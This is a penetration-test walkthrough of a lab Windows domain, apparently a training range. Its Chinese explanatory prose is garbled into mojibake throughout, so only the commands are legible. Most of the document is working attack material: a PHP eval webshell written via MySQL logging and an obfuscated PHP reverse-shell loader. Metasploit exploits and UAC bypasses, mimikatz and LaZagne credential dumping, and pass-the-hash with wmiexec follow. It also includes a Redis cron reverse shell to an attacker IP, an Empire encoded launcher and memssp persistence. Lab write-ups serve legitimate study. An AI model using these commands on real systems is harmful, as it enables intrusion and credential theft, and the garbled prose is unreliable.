root/rootå¼±å£ä»¤ç™»å½•ï¼Œphpinfo.phpæŸ¥çœ‹ç½‘ç«™ç»å¯¹è·¯å¾„C:/phpStudy/WWW æŸ¥çœ‹sqlè¯­å¥èƒ½å¦æ–‡ä»¶å†™å…¥ 1show variables like &#39;%secure%&#39; secure_file_priv=NULL å› æ­¤æ— æ³•é€šè¿‡into outfileå†™å…¥ è¿™é‡Œå¯ä»¥é€šè¿‡mysqlæ—¥å¿—å†™å…¥çš„æ–¹å¼getshell 12set global general_log &#x3D; &quot;ON&quot;SET global general_log_file&#x3D;&quot;C:&#x2F;phpStudy&#x2F;WWW&#x2F;eval.php&quot; æ’å…¥ä¸€å¥è¯ 1SELECT &quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;; èšå‰‘è¿æ¥æˆåŠŸ å››ã€åŸŸæ¸—é€1ipconfig &#x2F;all å‘ç°åœ¨god.orgåŸŸä¸­ é¦–å…ˆç»™msfå¼¹ä¸ªshellï¼Œå› ä¸ºå­˜åœ¨webæœåŠ¡ï¼Œæˆ‘ä»¬ç”¨msfvenomç”Ÿæˆä¸€ä¸ªshellcodeï¼Œè€Œä¸æ˜¯peæ–‡ä»¶ 1msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.129 LPORT&#x3D;3333 -f raw &gt; test.php è¿™é‡Œæ˜¾ç„¶æ²¡æœ‰æ€è½¯ï¼Œå¦‚æœæœ‰ï¼Œä¹‹å‰çš„ä¸€å¥è¯æœ¨é©¬åº”è¯¥æ˜¯å†™ä¸è¿›å»çš„ å…æ€payload åŠ å¯† 123$code = file_get_contents('test.php');$encode = base64_encode(gzdeflate($code));echo $encode; é»‘åå• 123456789101112$l = 'baSe6';$o = '4_dE';$v = 'cO';$e = 'DE';$love = $l.$o.$v.$e;$c = \"love\";$a = $$c('cGhwaW5mbygpOwo=');eval($a);$a = strrev('EdOcEd_46eSaB');$b = $a('cGhwaW5mbygpOwo=');eval($b); ç»¼åˆä¸Šé¢ä¸¤ä¸ªï¼Œæœ€åçš„test1.php 123456&lt;?php$a = strrev('EdOcEd_46eSaB');$c = strrev('eTALfNizG');$b = $a('lVNtb9MwEP4rpopmRyoZHQiNlkmUaSBE2RDtt2myHOfSWs3sKHb3oir/nbPd9IUxDfIp9j33vFwu0DSm4Q3UpnFKz9mbdEQSVZMzQgcfTrLB+9NskA1OTileewwW3uIzIqokjCWlB1rXgLjl1sglOC4rBdrRlBwdEWW5FFUl8goQm6ZkTRKLLUnJek7Ww+PjNYq1w3Xgbnte3HL3WMOOF5XboPYKW5FzI1p6OVODflEJFfrR/H/Qd2EQ4uBFifEX/u3yYtYn06vz73w6+3Ux/uEPEz47/+lVG/DITx2r0RqkY4ntkwN30QeCPXmhgKXe3b7nQLDvOZQ6ONWGRAgpV1pamu4hn4Ji2d4rJxcYfMclhYXtgIYkqUCjeonHIph+h405npajDhr5ttBN0L81dH4QeJhSYN9K10IuWe8Sq71+YPPji6SJuKb4Rm/wJvfTwDncL1QFhKFVrLAkT8lH0lH/Q7CcZPu5fOfrHdfzKUPfnyGf7W59vK+Tq8/jyfSa3tq576Q3PpIdPa0Et5tyeI+LAQ8OtFVG88qIAgpG7WphrOr+AK34HNz2NoMHkCtnmqxQ1i8thztR0c3eRgzPH2th7Vlcc+53xqEAoxTT5OF3OQDGLwUVDmNNPB0LqHbzFX8D');$d = $c($b);eval($d); msfå¼€å¯ç›‘å¬ 12345use exploit&#x2F;multi&#x2F;handlerset payload php&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.1.130set lport 3333exploit è¿›ç¨‹è¿ç§» æ³¨æ„ï¼šä»…Windowsæœ¬æœºmeterpreterï¼ˆwindows / meterpreter / reverse_tcpï¼‰æ”¯æŒè¿ç§»ã€‚ from PHP meterpreter to native meterpreter with sessions -u 3 12psmigrate 2596 msfææƒæ–¹æ³•getsystemææƒ 12meterpreter &gt; getsystem[-] Unknown command: getsystem. expææƒ ç»•è¿‡UACè¿›è¡Œææƒ 123exploit&#x2F;windows&#x2F;local&#x2F;bypassuacexploit&#x2F;windows&#x2F;local&#x2F;bypassuac_vbsexploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection æé«˜ç¨‹åºè¿è¡Œçº§åˆ« 1exploit&#x2F;windows&#x2F;local&#x2F;ask windowsææƒæ¼æ´ å¦‚ms13_053,ms14_058,ms16_016,ms16_032ç­‰ ================è¿™é‡Œä¸€å¼€å§‹å‡ºç°äº†ç‚¹é—®é¢˜ èŠ±äº†åŠå¤©æ²¡æå¥½ã€‚ã€‚ä¸»è¦æ˜¯ç½‘ä¸ŠåŸºæœ¬æ²¡æœ‰ç›¸å…³çš„ï¼Œè¿˜æœ‰ä¸ªè§£ç­”æ˜¯msfçš„ç‰ˆæœ¬ï¼Œä½†æ˜¯æˆ‘ä¸‹äº†å¥½å‡ ä¸ªç‰ˆæœ¬+proä¹Ÿä¸è¡Œã€‚ã€‚ã€‚åªæœ‰githubä¸Šæœ‰ä¸ªissueï¼Œåªæ˜¯æåˆ°äº†The target machine is Windows7 x64 ä¸è¿‡æœ€åè¿˜æ˜¯è§£å†³å•¦ ===========================åˆ†å‰²çº¿ ä½¿ç”¨cobaltstrike teamserverå¯åŠ¨æœåŠ¡ï¼Œä¸Šçº¿ï¼ŒListenerï¼Œgenerateç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶artifact.exeï¼ˆå› ä¸ºå½“å‰ç¯å¢ƒæ²¡æœ‰æ€è½¯ï¼Œæ•…ä¸è€ƒè™‘å…æ€ï¼‰ï¼Œå¯åŠ¨ä¹‹ååªè¦è¿›ç¨‹ä¸è¢«æ€æ‰ï¼Œéšæ—¶å¯ä»¥ä¸Šçº¿ã€‚ å¼€å¯è¿œç¨‹æ¡Œé¢è¿æ¥ é€šè¿‡cmdåˆ›å»ºç”¨æˆ·ï¼Œ ä½¿ç”¨è¿œç¨‹æ¡Œé¢è¿æ¥æ‰§è¡Œæ–‡ä»¶ è¿™é‡Œçš„cmdå¯ä»¥è€ƒè™‘èšå‰‘çš„è™šæ‹Ÿç»ˆç«¯,è¿˜æœ‰å›æ˜¾,meterpreterçš„shellæ²¡æœ‰å›æ˜¾ 123net user gqy test@1233 &#x2F;add net localgroup administrators gqy &#x2F;addREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f è‹¥ç›®æ ‡ä¸»æœºå¼€å¯äº†é˜²ç«å¢™é™åˆ¶äº†3389çš„è¿œç¨‹è¿æ¥ï¼Œå¯åå¼¹ä¸€ä¸ªmsfçš„shellå›æ¥ï¼Œå°è¯•å…³é—­é˜²ç«å¢™ 1meterpreter&gt; run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp èšå‰‘cmdå…³é—­é˜²ç«å¢™ 1netsh adcfirewall set allprofiles state off è¿œç¨‹æ¡Œé¢OWA\\gqy test@1233æˆåŠŸè¿ä¸Š æ³¨æ„è¿™é‡Œæœ‰æ—¶å€™å‰é¢è·Ÿçš„æ˜¯åŸŸ meterpreterä¸Šä¼ å¹¶æ‰§è¡Œæ–‡ä»¶ 12upload &#x2F;tmp&#x2F;artifact.exe C:&#x2F;Windowsexecute -f artifact.exe csä¸msfè”åŠ¨å…ˆæ–°å»ºä¸€ä¸ªforeign Listenerï¼Œç„¶åæŠŠæƒ³æ´¾ç”Ÿçš„shellå³é”®spawné€‰æ‹©æ–°å»ºçš„foreignlistener msfç›‘å¬ 12345use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.1.130set lport 1233exploit å› ä¸ºæ˜¯windows/meterpreter/reverse_tcpï¼Œè¿™ä¸ªshellæ˜¯å¯ä»¥ç›´æ¥è¿›ç¨‹è¿ç§»çš„ è·å–å¯†ç æˆ–hashDump Hashes+Run Mimikatz ä½¿ç”¨LaZagneæŠ“å–æ‰€æœ‰æ”¯æŒè½¯ä»¶çš„å¯†ç  meterpreteræˆ–csä¸Šä¼ ï¼Œ csæ‰§è¡Œ 1bracon&gt;shell laZagne.exe all msfè¿›å…¥shellæ‰§è¡Œ 1laZagne.exe all ä¿¡æ¯æ”¶é›†cmd 1ipconfig &#x2F;all beacon 12shell net config Workstationnet view å¾—åˆ°192.168.52.138æ˜¯åŸŸæ§ å†…ç½‘æ”¶é›†æŸ¥çœ‹windwosæ¼æ‰“çš„è¡¥ä¸ https://github.com/AonCyberLabs/Windows-Exploit-Suggester 123456789run post&#x2F;windows&#x2F;gather&#x2F;checkvm #æ˜¯å¦è™šæ‹Ÿæœºrun post&#x2F;linux&#x2F;gather&#x2F;checkvm #æ˜¯å¦è™šæ‹Ÿæœºrun post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives #æŸ¥çœ‹åˆ†åŒºrun post&#x2F;windows&#x2F;gather&#x2F;enum_applications #è·å–å®‰è£…è½¯ä»¶ä¿¡æ¯run post&#x2F;windows&#x2F;gather&#x2F;dumplinks #è·å–æœ€è¿‘çš„æ–‡ä»¶æ“ä½œrun post&#x2F;windows&#x2F;gather&#x2F;enum_ie #è·å–IEç¼“å­˜run post&#x2F;windows&#x2F;gather&#x2F;enum_chrome #è·å–Chromeç¼“å­˜run post&#x2F;windows&#x2F;gather&#x2F;enum_patches #è¡¥ä¸ä¿¡æ¯run post&#x2F;windows&#x2F;gather&#x2F;enum_domain #æŸ¥æ‰¾åŸŸæ§ æŸ¥çœ‹è·¯ç”±ä¿¡æ¯ 1run get_local_subnets æ·»åŠ è·¯ç”±å¹¶æ‰«æ 12run autoroute -s 192.168.52.0&#x2F;24run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.52.0&#x2F;24 å‰é¢çœ‹åˆ°é¶æœºå­˜åœ¨nmapï¼Œä½¿ç”¨nmapçš„ç«¯å£æ‰«æ 12nmap --script&#x3D;vuln 192.168.52.141nmap --script&#x3D;vuln 192.168.52.138 192.168.52.141 192.168.52.138 å†…ç½‘æ”»å‡»å§¿åŠ¿-MS08-067 MS08-067æ¼æ´æ˜¯é€šè¿‡MSRPC over SMBé€šé“è°ƒç”¨ServeræœåŠ¡ç¨‹åºä¸­çš„NetPathCanonicalizeå‡½æ•°æ—¶è§¦å‘çš„ï¼Œè€ŒNetPathCanonicalizeå‡½æ•°åœ¨è¿œç¨‹è®¿é—®å…¶ä»–ä¸»æœºæ—¶ï¼Œä¼šè°ƒç”¨NetpwPathCanonicalizeå‡½æ•°ï¼Œå¯¹è¿œç¨‹è®¿é—®çš„è·¯å¾„è¿›è¡Œè§„èŒƒåŒ–ï¼Œè€Œåœ¨NetpwPathCanonicalizeå‡½æ•°ä¸­å­˜åœ¨çš„é€»è¾‘é”™è¯¯ï¼Œé€ æˆæ ˆç¼“å†²åŒºå¯è¢«æº¢å‡ºï¼Œè€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRemote Code Executionï¼‰ã€‚ æ‰“payloadä¹‹å‰éœ€è¦åå‘ä»£ç†ï¼ˆautorouteåªç”¨äºæ‰«æï¼‰ï¼Œæˆ‘ç”¨ew ä¸Šä¼ åˆ°é¶æœº 1ew_for_Win.exe -s rssocks -d 192.168.1.130 -e 8888 kali 1.&#x2F;ew_for_Linux32 -s rcsocks -l 1080 -e 8888 proxychainså¯åŠ¨msfconsole ä¸è®¾ç½® payloadï¼Œæ”»é™·åç›´æ¥è·å¾—é¶æœº1çš„cmdè€Œä¸æ˜¯meterpreter æ³¨æ„ä¸‹å¦‚æœå‰é¢ç”¨äº†åå‘ä»£ç†ï¼Œè¿™é‡Œpayloadéœ€è¦ç”¨æ­£å‘ 12345search ms08-067use exploit&#x2F;windows&#x2F;smb&#x2F;ms08_067_netapiset RHOSTS 192.168.52.141set payload windows&#x2F;meterpreter&#x2F;bind_tcprun å‘ç°ä¸å¤ªç¨³å®šï¼Œè¿›ç¨‹è¿ç§»ä¹Ÿæ˜¯ä¸€æ · mimikatzæ’ä»¶é€šè¿‡mimikatzæ’ä»¶å¯ä»¥æŸ¥çœ‹ä¸»æœºæ‰€åœ¨åŸŸï¼Œä»¥åŠå¯†ç æ”¶é›† 12345load mimikatzmimikatz_command -f system::computermimikatz_command -f samdump::hashesmimikatz_command -f sekurlsa::searchPasswordswdigest æ²¡æœ‰æˆåŠŸæŠ“åˆ° å†…ç½‘æ”»å‡»å§¿åŠ¿-SMBè¿œç¨‹æ¡Œé¢å£ä»¤çŒœæµ‹1search smb_login 123456use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_loginmsf exploit (smb_login)&gt;set rhosts 192.168.127.235msf exploit (smb_login)&gt;set user_file &#x2F;root&#x2F;Pentest&#x2F;user.txtmsf exploit (smb_login)&gt;set pass_file &#x2F;root&#x2F;Pentest&#x2F;pass.txtmsf exploit (smb_login)&gt;set stop_on_success truemsf exploit (smb_login)&gt;exploit å†…ç½‘æ”»å‡»å§¿åŠ¿-Oracleæ•°æ®åº“ TNSæœåŠ¡æ¼æ´ oracle TNS Listenerè¿œç¨‹æŠ•æ¯’ï¼ˆCVE-2012-1675ï¼‰ 1use auxiliary&#x2F;scanner&#x2F;oracle&#x2F;tnspoison_checker TNSä¸Šçš„ç¼“å†²åŒºæ¼æ´ï¼ˆCVE-2009-1979ï¼‰ 1exploit&#x2F;windows&#x2F;oracle&#x2F;tns_auth_sesskey CVE-2002-0965MSFä¸­æ¼æ´åˆ©ç”¨æ¨¡å— 1exploit&#x2F;windows&#x2F;oracle&#x2F;tns_service_name å†…ç½‘æ”»å‡»å§¿åŠ¿-RPC DCOMæœåŠ¡æ¼æ´ å¾®è½¯ä¿®æ”¹dcerpcæ¡†æ¶åå½¢æˆè‡ªå·±çš„RPCæ¡†æ¶æ¥å¤„ç†è¿›ç¨‹é—´çš„é€šä¿¡ã€‚å¾®è½¯çš„RPCæ¡†æ¶åœ¨å¤„ç†TCP/IPä¿¡æ¯äº¤æ¢è¿‡ç¨‹ä¸­å­˜åœ¨çš„ç•¸å½¢æ¶ˆæ¯æ—¶ï¼Œæœªæ­£ç¡®å¤„ç†ï¼Œå¯¼è‡´ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼›æ­¤æ¼æ´å½±å“ä½¿ç”¨RPCæ¡†æ¶çš„DCOMæ¥å£ï¼ŒDCOMæ¥å£ç”¨æ¥å¤„ç†å®¢æˆ·ç«¯æœºå™¨å‘é€ç»™æœåŠ¡å™¨çš„DCOMå¯¹è±¡æ¿€æ´»è¯·æ±‚ï¼Œå¦‚UNCè·¯å¾„ã€‚ 1234search ms03_026use exploit&#x2F;windows&#x2F;dcerpc&#x2F;ms03_026_dcomset rhosts 192.168.52.141run æ²¡æˆåŠŸ å†…ç½‘æ”»å‡»å§¿åŠ¿- MS17-0101234search ms17-010use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblueset rhosts 192.168.52.141run æ²¡æˆåŠŸï¼Œå¯èƒ½æ˜¯ç”±äºå‰é¢æ‰“äº†ä¸€äº›åˆ«çš„payload é’“é±¼æ”»å‡»è¿™ä¸ªä¹‹å‰è¿˜çœŸæ²¡æè¿‡ å¿«æ·æ–¹å¼ é’“é±¼é“¾æ¥ ä½†æ˜¯ä¸‹è½½å®Œæˆä¹‹åè¿˜éœ€è¦è¿è¡Œï¼Œå› æ­¤éœ€è¦ä¸€å®šçš„ä¼ªè£…æŠ€å·§ï¼Œæ¯”å¦‚Clone Site okï¼Œä¸ŠåŠéƒ¨åˆ†è‡³æ­¤å°±ç»“æŸäº† å†…ç½‘å…¶ä»–ä¸»æœºç«¯å£-redis Getshell1proxychains redis-cli -h 192.168.52.138 â‘ é€šè¿‡å†™SSH keyçš„æ–¹å¼è¿›è¡Œgetshell 1234567891011ç”Ÿæˆå¯†é’¥å¯¹ssh-keygen -t rsaå°†ç”Ÿæˆçš„å…¬é’¥å†™å…¥åˆ°æ–‡ä»¶ä¸­(echo -e &quot;\\n\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n\\n&quot;) &gt; pub.txtè®¾ç½®è·¯å¾„ã€æ–‡ä»¶ã€å†™å…¥å…¬é’¥ config set dir &#x2F;root&#x2F;.ssh&#x2F;config set dbfilename &quot;authorized_keys&quot;saveexitè¿æ¥ssh -i id_rsa root@192.168.2.155 â‘¡å‘Webç›®å½•ä¸­å†™webshellçš„æ–¹å¼è¿›è¡Œgetshell 123456flushdbconfig set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;config set dbfilename &quot;gaia.php&quot;set gaia &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;saveexit â‘¢rediså†™å®šæ—¶ä»»åŠ¡åå¼¹shell 1234config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;config set dbfilename rootset x &quot;\\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.2.155&#x2F;2333 0&gt;&amp;1\\n&quot;save å†…ç½‘å…¶ä»–ä¸»æœºç«¯å£-Mysqlææƒ 1.UDFææƒudfæ˜¯Mysqlç±»ææƒçš„æ–¹å¼ä¹‹ä¸€ã€‚å‰ææ˜¯å·²çŸ¥mysqlä¸­rootçš„è´¦å·å¯†ç ï¼Œæˆ‘ä»¬åœ¨æ‹¿åˆ°webshellåï¼Œå¯ä»¥çœ‹ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„config.phpé‡Œï¼Œä¸€èˆ¬éƒ½æœ‰mysqlçš„è´¦å·å¯†ç ã€‚åˆ©ç”¨rootæƒé™ï¼Œåˆ›å»ºå¸¦æœ‰è°ƒç”¨cmdå‡½æ•°çš„â€™udf.dllâ€™(åŠ¨æ€é“¾æ¥åº“)ã€‚å½“æˆ‘ä»¬æŠŠâ€™udf.dllâ€™å¯¼å‡ºæŒ‡å®šæ–‡ä»¶å¤¹å¼•å…¥Mysqlæ—¶ï¼Œå…¶ä¸­çš„è°ƒç”¨å‡½æ•°æ‹¿å‡ºæ¥å½“ä½œmysqlçš„å‡½æ•°ä½¿ç”¨ã€‚è¿™æ ·æˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°æ‰è¢«å½“ä½œæœ¬æœºå‡½æ•°æ‰§è¡Œã€‚åœ¨ä½¿ç”¨CREAT FUNCITONè°ƒç”¨dllä¸­çš„å‡½æ•°åï¼Œmysqlè´¦å·è½¬åŒ–ä¸ºsystemæƒé™ï¼Œä»è€Œæ¥ææƒã€‚2.MOFææƒæ‰˜ç®¡å¯¹è±¡æ ¼å¼ (MOF) æ–‡ä»¶æ˜¯åˆ›å»ºå’Œæ³¨å†Œæä¾›ç¨‹åºã€äº‹ä»¶ç±»åˆ«å’Œäº‹ä»¶çš„ç®€ä¾¿æ–¹æ³•ã€‚æ–‡ä»¶è·¯å¾„ä¸ºï¼šc:/windows/system32/wbme/mof/ï¼Œå…¶ä½œç”¨æ˜¯æ¯éš”äº”ç§’å°±ä¼šå»ç›‘æ§è¿›ç¨‹åˆ›å»ºå’Œæ­»äº¡ã€‚MOFæ–‡ä»¶æ¯äº”ç§’å°±ä¼šæ‰§è¡Œï¼Œè€Œä¸”æ˜¯ç³»ç»Ÿæƒé™ï¼Œé€šè¿‡mysqlä½¿ç”¨load_file å°†æ–‡ä»¶å†™å…¥/wbme/mofï¼Œç„¶åç³»ç»Ÿæ¯éš”äº”ç§’å°±ä¼šæ‰§è¡Œä¸€æ¬¡æˆ‘ä»¬ä¸Šä¼ çš„MOFã€‚MOFå½“ä¸­æœ‰ä¸€æ®µæ˜¯vbsè„šæœ¬ï¼Œå¯ä»¥é€šè¿‡æ§åˆ¶è¿™æ®µvbsè„šæœ¬çš„å†…å®¹è®©ç³»ç»Ÿæ‰§è¡Œå‘½ä»¤ï¼Œè¿›è¡Œææƒã€‚ sqlmapä¸€æŠŠæ¢­ 1sqlmap -d &quot;mysql:&#x2F;&#x2F;root:123456@node3.buuoj.cn:26002&#x2F;mysql&quot; --os-shell PTH pass-the-hashï¼Œåœ¨Windowsç³»ç»Ÿä¸­ï¼Œé€šå¸¸ä¼šä½¿ç”¨NTLMèº«ä»½è®¤è¯ï¼ŒNTLMè®¤è¯ä¸ä½¿ç”¨æ˜æ–‡å£ä»¤ï¼Œè€Œæ˜¯ä½¿ç”¨å£ä»¤åŠ å¯†åçš„hashå€¼ï¼Œhashå€¼ç”±ç³»ç»ŸAPIç”Ÿæˆ(ä¾‹å¦‚LsaLogonUser)ï¼Œåˆ†ä¸ºLM hashå’ŒNT hashï¼Œå¦‚æœæ”»å‡»è€…è·å¾—äº†hashï¼Œå°±èƒ½å¤Ÿåœ¨èº«ä»½éªŒè¯çš„æ—¶å€™æ¨¡æ‹Ÿè¯¥ç”¨æˆ·(å³è·³è¿‡è°ƒç”¨APIç”Ÿæˆhashçš„è¿‡ç¨‹)ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡LM Hashå’ŒNTLM Hashè®¿é—®è¿œç¨‹ä¸»æœºæˆ–æœåŠ¡ï¼Œè€Œä¸ç”¨æä¾›æ˜æ–‡å¯†ç ã€‚è¿™ç±»æ”»å‡»é€‚ç”¨äºï¼šåŸŸ/å·¥ä½œç»„ç¯å¢ƒï¼Œå¯ä»¥è·å¾—hashï¼Œä½†æ˜¯æ¡ä»¶ä¸å…è®¸å¯¹hashçˆ†ç ´ï¼Œå†…ç½‘ä¸­å­˜åœ¨å’Œå½“å‰æœºå™¨ç›¸åŒçš„å¯†ç ï¼Œä»windowsåˆ°windowsæ¨ªå‘pthè¿™ä¸€ç±»æ”»å‡»æ–¹æ³•æ¯”è¾ƒå¹¿æ³› ä¸Šä¼ ä¸€ä¸ªmimkatz åˆ©ç”¨ä¹‹å‰logonpasswordså¾—åˆ°çš„hash 123mimikatzprivilege:debug sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:god.org &#x2F;ntlm:8601a88798be6a3948fce638a5790741 è¿™æ—¶å€™å°±å¯ä»¥å°±ipcè¿æ¥äº† åŸŸæ¸—é€-æ¨ªå‘ç§»åŠ¨[wmiåˆ©ç”¨] WMIæ˜¯ä¸€ä¸ªç³»ç»Ÿæ’ä»¶,ç”¨äºåœ¨æœ¬åœ°è¿œç¨‹ç®¡ç†è®¡ç®—æœºçš„è¿›ç¨‹,æœåŠ¡,æ³¨å†Œè¡¨ç­‰å…¶å®ƒçš„ä¸€ç³»åˆ—çš„ç‰¹æƒæ“ä½œ ä½¿ç”¨msf 1234567use exploit&#x2F;windows&#x2F;local&#x2F;wmiset SMBUser administratorset SMBPass vulstack@1set payload windows&#x2F;meterpreter&#x2F;bind_tcpset SMBDomain god.orgset session 3run å¤±è´¥äº†ï¼Œæˆ–è€…ä½¿ç”¨wmiexec 1234567git clone https:&#x2F;&#x2F;github.com&#x2F;ropnop&#x2F;impacket_static_binariespython setup.py installcd examplesproxychains python wmiexec.py -debug &#39;administrator:vulstack@1@192.168.52.138&#39;proxychains python wmiexec.py -debug -hashes 00000000000000000000000000000000:8601a88798be6a3948fce638a5790741 &#39;administrator@192.168.52.138&#39; æˆ–è€…è¿™ä¸ªï¼šhttps://github.com/Kevin-Robertson/Invoke-TheHash å…ˆä¸Šä¼  1Import-Moudle .\\Invoke-TheHash.psd1 1Invoke-WMIExec -Target 192.168.52.138 -Domain workgroup -Username administrator -Hash 8601a88798be6a3948fce638a5790741 -Command &quot;calc.exe&quot; -verbose è¿™ä¸ªå¾—å¾—åˆ°ä¸€ä¸ªpsçš„shell è¿™é‡Œä½¿ç”¨Empire https://github.com/BC-SECURITY/Empire 1234uselistener httpset Port 8080set Name testexecute 12backlist 12345usestagerï¼ˆç©ºæ ¼+tabï¼‰usestager windows&#x2F;launcher_batinfoset Listener testexecute ç”Ÿæˆlauncher.bat 123@echo offstart &#x2F;b powershell -noP -sta -w 1 -enc WwBSAGUARgBdAC4AQQBTAHMAZQBNAEIAbABZAC4ARwBFAHQAVAB5AHAAZQAoACcAUwB5AHM...start &#x2F;b &quot;&quot; cmd &#x2F;c del &quot;%~f0&quot;&amp;exit &#x2F;b æ”¶åˆ°äº†è¯·æ±‚ï¼Œä½†æ˜¯æ²¡æœ‰agents 123usestager launcher_vbs testset Listener testexecute æ²¡æˆåŠŸ ===========================åˆ†å‰²çº¿ ç›´æ¥csæ‰§è¡Œpså‘½ä»¤å³å¯ã€‚ã€‚ã€‚ å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-ä»£ç†è½¬å‘æˆ‘ä¸»è¦æ˜¯é€šè¿‡ew Frpå†…ç½‘ç©¿é€æŠŠè‡ªå·±çš„kaliæ”¾åˆ°å…¬ç½‘ä¸Šï¼Œå‚è€ƒä¹‹å‰çš„æ–‡ç«  https://glotozz.github.io/2020/03/13/FRP%E6%90%AD%E5%BB%BA/ CSä¸Šçº¿å†…ç½‘ä¸»æœºproxychainså¯åŠ¨csï¼Œå¹¶æ‰§è¡Œ ç”Ÿæˆbeacon.exe åˆ©ç”¨ipcä¸Šä¼ æˆ–è€…smbclientä¸Šä¼  1copy beacon.exe \\\\192.168.52.138\\c$ 12proxychains smbclient &#x2F;&#x2F;192.168.52.138&#x2F;c$ -U administratorput &#x2F;tmp&#x2F;beacon.exe åˆ©ç”¨wmiæ‰§è¡Œ æˆåŠŸä¸Šçº¿ SSHéš§é“ è¿™ç§ä»£ç†æ–¹å¼éœ€è¦æ¯”è¾ƒé«˜çš„æƒé™(system/root)ç›´æ¥ä½¿ç”¨ç³»ç»ŸåŠŸèƒ½æ¥å¼€å¯å†…ç½‘ä»£ç†çš„éš§é“ï¼Œé€šè¿‡SSHéš§é“è¿›è¡Œä»£ç† 12ssh -qTfnN -L port:host:hostport -l user remote_ip #æ­£å‘éš§é“ï¼Œç›‘å¬æœ¬åœ°portssh -qTfnN -R port:host:hostport -l user remote_ip #åå‘éš§é“ï¼Œç”¨äºå†…ç½‘ç©¿é€é˜²ç«å¢™é™åˆ¶ä¹‹ç±» 12ssh -CfNg -L port1:127.0.0.1:port2 user@host #æœ¬åœ°è½¬å‘ssh -CfNg -R port2:127.0.0.1:port1 user@host #è¿œç¨‹è½¬å‘ æŒä¹…æ§åˆ¶åŸŸæˆå‘˜ä¿¡æ¯æ”¶é›† 123456net localgroup administrator &#x2F;domainnet group &#x2F;domainnet group &quot;domain admins&quot; &#x2F;domainnet user &#x2F;domaindsquery usernet accounts &#x2F;domain åˆ©ç”¨SPNå¿«é€Ÿæ‰«æåŸŸå†…å­˜æ´»ç›¸å…³æœåŠ¡ä»¥åŠå¿«é€Ÿå®šä½æœåŠ¡å™¨ 1setspn -T OWA-god.god.org -Q *&#x2F;* HTTP Listeneräº¤äº’ä¿¡æ¯éšè— 1.å°†Cobalt Strikeé…ç½®æ–‡ä»¶è½¬æ¢ä¸ºåŠŸèƒ½æ€§çš„mod_rewrite .htaccessæˆ–Nginxé…ç½®æ–‡ä»¶ï¼Œä»¥æ”¯æŒå°†HTTPåå‘ä»£ç†é‡å®šå‘åˆ°Cobalt Strikeå›¢é˜ŸæœåŠ¡å™¨ã€‚ä½¿ç”¨åå‘ä»£ç†å¯ä»¥ä¿æŠ¤åç«¯C2æœåŠ¡å™¨å…å—åˆ†æï¼Œè°ƒæŸ¥å’Œä¸€èˆ¬InternetèƒŒæ™¯è¾å°„ã€‚https://github.com/threatexpress/cs2modrewrite2.Cobalt Strikeé€šè¿‡Malleable C2é…ç½®æ–‡ä»¶ä¿®æ”¹å…¶æµé‡ã€‚é…ç½®æ–‡ä»¶æä¾›äº†é«˜åº¦å¯å®šåˆ¶çš„é€‰é¡¹ï¼Œç”¨äºä¿®æ”¹æœåŠ¡å™¨çš„C2æµé‡åœ¨çº¿è·¯ä¸Šçš„å½¢å¼ã€‚Malleable C2é…ç½®æ–‡ä»¶å¯å¢åŠ å¼ºäº‹ä»¶å“åº”çš„è§„é¿ï¼Œä½¿ç”¨çš„åˆæ³•å†…éƒ¨åº”ç”¨ç¨‹åºå†’å……å·²çŸ¥å¯¹æ‰‹æˆ–ä¼ªè£…ç›®æ ‡ã€‚https://github.com/rsmudge/Malleable-C2-Profiles SSP 1.SSPï¼Œç”¨äºæ‰©å±•Windowsèº«ä»½éªŒè¯æœºåˆ¶ã€‚LSASSè¿›ç¨‹æ­£åœ¨Windowså¯åŠ¨æœŸé—´åŠ è½½å®‰å…¨æ”¯æŒæä¾›ç¨‹åºDLLã€‚è¿™ç§è¡Œä¸ºä½¿çº¢é˜Ÿçš„æ”»å‡»è€…å¯ä»¥åˆ é™¤ä¸€ä¸ªä»»æ„çš„SSP DLLä»¥ä¾¿ä¸LSASSè¿›ç¨‹è¿›è¡Œäº¤äº’å¹¶è®°å½•è¯¥è¿›ç¨‹ä¸­å­˜å‚¨çš„æ‰€æœ‰å¯†ç ï¼Œæˆ–è€…ç›´æ¥ç”¨æ¶æ„çš„SSPå¯¹è¯¥è¿›ç¨‹è¿›è¡Œä¿®è¡¥ã€‚ 2.é¡¹ç›®Mimikatzæä¾›äº†ä¸€ä¸ªDLLæ–‡ä»¶ï¼ˆmimilib.dllï¼‰ï¼Œå¯ä»¥å°†å…¶æ”¾åˆ°ä¸LSASSè¿›ç¨‹ï¼ˆSystem32ï¼‰ç›¸åŒçš„ä½ç½®ï¼Œä»¥ä¾¿ä¸ºè®¿é—®å—æ„ŸæŸ“ä¸»æœºçš„ä»»ä½•ç”¨æˆ·è·å¾—çº¯æ–‡æœ¬å‡­æ®ã€‚Mimikatzé€šè¿‡å‘LSASSæ³¨å…¥æ–°çš„SSPæ¥æ”¯æŒå†…å­˜æŠ€æœ¯é€‰é¡¹ã€‚ 12privilege::debugmisc::memssp 